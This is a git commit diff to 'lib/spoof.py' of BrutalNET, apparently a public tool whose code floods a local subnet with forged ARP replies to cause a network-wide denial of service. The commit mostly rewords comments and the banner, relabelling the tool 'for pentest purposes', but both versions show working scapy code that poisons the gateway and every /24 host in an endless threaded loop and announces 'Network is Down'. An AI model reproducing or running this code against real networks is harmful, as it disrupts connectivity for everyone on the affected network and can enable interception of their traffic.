d92ab0a0d0daf37241e700cfff07a1df2bdf7a42
cybermad <171419864+cybermads@users.noreply.github.com>
2025-12-03 17:01:07 +0900

    Update spoof.py

--- lib/spoof.py
+++ lib/spoof.py
@@ -1,7 +1,5 @@
 # Author: cybermad
-# BrutalNET A DoS denial-of-service through ARP Spoofing.
-# sends ARP packets to every host on the network poisoning its ARP table.
-# When the ARP table becomes corrupted, the data flow is completely distorted, leading to network failure.
+# BrutalNET is network denial-of-service through ARP Spoof for pentest purposes
 
 from scapy.all import *
 import ipaddress
@@ -37,35 +35,36 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``
 ?MXT@Wx.~    :     ~"##*$$$$M~
-      
-{r}    
-    {g}[*]{r}      {h}ARP Spoofing Tool.{r}               {g}[*]{r} 
-    {g}[*]{r}      {h}Version : 1.0{r}                    {g}[*]{r} 
+
+{r}
+    {g}[*]{r}      {h}ARP Attack Tool.{r}                 {g}[*]{r}
+    {g}[*]{r}      {h}Version : 1.0{r}                    {g}[*]{r}
     {g}[*]{r}      {h}Created :{c} {c}cybermad{r}               {g}[*]{r}
     {g}[*]{r}      {h}github  : github.com/cybermads{r}   {g}[*]{r}
     {g}[*]{r}      {h}youtube : youtube.com/@cybermads{r} {g}[*]{r}
-            
-    {c}ARP Network denial of service.{r}
+
+    {c}network denial of service.{r}
           """)
 
 def arp(host, gateway, mac, iface):
-    # poison arp cache
-    gateway_packet = ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
-    sendp(Ether(dst=mac) / gateway_packet, iface=iface, verbose=0)
-    broadcast_packet = ARP(op=2, psrc=gateway, pdst=host, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC())
-    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / broadcast_packet, iface=iface, verbose=0)
+    # ARP spoofed packets
+    victim_packet = ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
+    sendp(Ether(dst=mac) / victim_packet, iface=iface, verbose=0)
+    gateway_packet = ARP(op=2, psrc=gateway, pdst=host, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC())
+    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / gateway_packet, iface=iface, verbose=0)
 
 def attack(gateway, mac, iface):
-    # Generate all /24 IPv4 hosts
-    # thread host to send ARP packets
+    # Poison ARP tables of all hosts in the subnet
+    # using threads to send spoofed ARP packets to each host
+
     while True:
         ipv4 = ipaddress.IPv4Network(f"{gateway}/24", strict=False)
         lists = [str(ip) for ip in ipv4.hosts() if str(ip) != gateway]
-        
+
         for ip in lists:
             t = threading.Thread(target=arp, args=(ip, gateway, mac, iface))
         t.start()
-        
+
 def arpspoof():
     banner()
     iface = input(f"[{c}+{r}] interface{c}:{r} ")
@@ -77,4 +76,6 @@ def arpspoof():
     time.sleep(2)
     print(f"[{g}+{r}] {b}{iface}{r} {b}{subnet}{r}  {g}>{r} {gateway}{g}::{r}{mac} {c}Network is Down !!{r}")
     attack(gateway, mac, iface)
+
+
 
